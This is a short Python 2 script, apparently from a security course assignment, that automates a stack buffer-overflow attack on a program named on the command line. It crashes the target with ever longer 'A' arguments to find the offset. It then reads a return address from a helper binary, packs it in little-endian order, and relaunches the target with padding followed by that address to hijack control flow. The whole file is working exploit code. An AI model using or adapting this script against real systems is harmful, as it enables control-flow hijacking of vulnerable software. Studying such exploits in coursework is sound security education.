

import subprocess 
import os
import sys



def find_offset(prg_name):
    counter = 1
    fileo = open('/dev/null')
    while True:
        p1 = subprocess.Popen([prg_name, 'A' * counter], stdout=fileo, shell=False)
        exit_codes = p1.wait()
        counter += 1
        if exit_codes != 0:
            break
    return counter - 1




def find_return_address():
     

     proc = subprocess.Popen(["/home/armin/hw4/find_return_address",], stdout=subprocess.PIPE, shell=True)
     (return_address, error) = proc.communicate()
     m_list =[return_address[i:i+2] for i in range(0, len(return_address), 2)]
     m_list.reverse()
     x = [int(p, 16) for p in m_list]	
     return "".join(map(chr,x))


def action(prg_name,offset,return_addr):
     subprocess.call([prg_name, 'X'*offset + return_addr ])


program_name = sys.argv[1]
offset_value = find_offset(program_name)
print offset_value
ret_address  = find_return_address()


action(program_name, offset_value, ret_address)
